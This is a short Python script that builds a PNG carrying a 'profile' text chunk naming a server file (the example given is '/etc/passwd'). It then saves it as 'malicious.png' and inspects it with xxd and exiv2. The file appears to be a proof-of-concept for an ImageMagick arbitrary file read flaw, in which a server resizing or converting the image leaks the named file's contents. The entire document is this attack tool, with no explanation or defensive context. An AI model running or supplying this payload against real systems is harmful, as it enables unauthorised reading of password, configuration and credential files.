from PIL import Image
import subprocess
from termcolor import colored

# Create Image --------------------------------------------------------------->

filename = input("Insert image filename: ")
image = Image.new("RGB", (100, 100))
image.save(filename)

# Injects the malicious text chunk ------------------------------------------->

file_to_read = input("Insert file to read (es:'/etc/passwd'): ") 

print(colored(
	f"\n[*] exec: pngcrush -text a profile {file_to_read} {filename} "
	"malicious.png\n",
	"blue"))

cmd = [
	'pngcrush', 
	'-text', 
	'a', 
	'profile', 
	file_to_read, 
	filename, 
	'malicious.png'
]
subprocess.run(cmd)

# View content --------------------------------------------------------------->

print(colored("\n[*] exec: xxd malicious.png\n", "blue"))
cmd = ['xxd', 'malicious.png']
subprocess.run(cmd)

# View metadata -------------------------------------------------------------->

print(colored("\n[*] exec: exiv2 -pS malicious.png\n", "blue"))
cmd = ['exiv2', '-pS', 'malicious.png']
subprocess.run(cmd)
